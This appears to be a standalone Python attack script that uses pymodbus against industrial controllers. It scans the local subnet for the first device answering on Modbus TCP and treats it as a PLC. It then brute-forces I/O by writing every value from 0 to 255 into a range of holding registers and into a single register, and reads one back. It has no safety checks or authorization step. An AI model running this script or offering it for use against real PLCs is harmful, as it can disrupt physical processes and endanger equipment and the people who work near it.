from pymodbus.client.sync import ModbusTcpClient
import socket
import time
import random

# Function to find the PLC's IP address
def find_plc_ip():
    # Assuming the PLC is on the same subnet as the Windows machine
    ip_address = socket.gethostbyname(socket.gethostname())
    subnet = '.'.join(ip_address.split('.')[:3]) + '.'
    for i in range(1, 255):
        try:
            client = ModbusTcpClient(subnet + str(i))
            connection = client.connect()
            if connection:
                print(f"Found PLC at IP address: {subnet + str(i)}")
                return subnet + str(i)
        except Exception as e:
            pass
    return None

# Function to perform brute force I/O on a range of I/O point values
def brute_force_io_range(client, start_address, end_address, max_value):
    # Use the write_register function from pymodbus
    # Note: The addresses and max_value might need to be adjusted based on the PLC's memory layout
    for address in range(start_address, end_address + 1):
        for value in range(max_value + 1):
            client.write_register(address, value)
            time.sleep(0.1)  # Wait for 100ms before changing the value again

# Function to perform brute force I/O on a single I/O point value
def brute_force_io_single(client, address, max_value):
    # Use the write_register function from pymodbus
    # Note: The address and max_value might need to be adjusted based on the PLC's memory layout
    for value in range(max_value + 1):
        client.write_register(address, value)
        time.sleep(0.1)  # Wait for 100ms before changing the value again

# Function to read I/O point values
def read_io_point(client, address):
    # Use the read_holding_registers function from pymodbus
    # Note: The address might need to be adjusted based on the PLC's memory layout
    result = client.read_holding_registers(address, 1)
    return result.registers[0]

# Example usage
if __name__ == "__main__":
    try:
        # Find the PLC's IP address
        plc_ip_address = find_plc_ip()
        if plc_ip_address:
            # Create a Modbus client
            client = ModbusTcpClient(plc_ip_address)
            connection = client.connect()
            print(f"Connected to PLC: {connection}")
            
            # Perform brute force I/O on a range of I/O point values
            start_address = 0x1000  # Example: Start address
            end_address = 0x1005  # Example: End address
            max_value = 0xFF  # Example: Maximum value
            brute_force_io_range(client, start_address, end_address, max_value)
            print(f"Performed brute force I/O on range of I/O point values from {start_address} to {end_address}")
            
            # Perform brute force I/O on a single I/O point value
            address = 0x1000  # Example: Address
            max_value = 0xFF  # Example: Maximum value
            brute_force_io_single(client, address, max_value)
            print(f"Performed brute force I/O on single I/O point value at address {address}")
            
            # Read I/O point value
            current_value = read_io_point(client, address)
            print(f"Current I/O point value at address {address}: {current_value}")
        else:
            print("Failed to find PLC's IP address")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Close the client
        if 'client' in locals():
            client.close()